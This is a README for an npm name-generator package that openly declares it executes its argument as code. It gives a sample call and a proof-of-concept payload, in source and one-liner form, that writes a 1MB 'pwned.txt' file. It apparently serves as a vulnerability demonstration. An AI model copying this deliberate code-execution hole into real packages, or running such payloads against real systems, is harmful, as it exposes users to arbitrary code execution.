# mad-name-generator

MAD Name Generator for gamers
Based on andreasonny83 unique name generator:
https://www.npmjs.com/package/unique-names-generator

This package is vulnerable to Arbitrary Code Execution.
The parameter passed to the function is executed as a command inside a shell, which allows attackers to execute
arbitrary code.

Example:

```js
// index.ts

console.log(generateRandomName('console.log("Hello")'));

```

Of course more malicious payloads can be used.
Let's take a look at the source code:

```js
var fs = require("fs"), stream = fs.createWriteStream("pwned.txt", { flags: "w" });
const megabyte = "1000000", outputStr = "yougotpwned";
for (var i = 0; i < megabyte / outputStr.length; i++) {
  stream.write("yougotpwned");
}
stream.end();
```

The one-liner command for the above code is:

```js
    'var fs=require("fs"),stream=fs.createWriteStream("pwned.txt",{flags:"w"});const megabyte="1000000",outputStr="yougotpwned";for(var i=0;i<megabyte/outputStr.length;i++) {stream.write("yougotpwned");}stream.end();'
```

This will create a file with 1MB of data.
The file is created in the current working directory of the application.
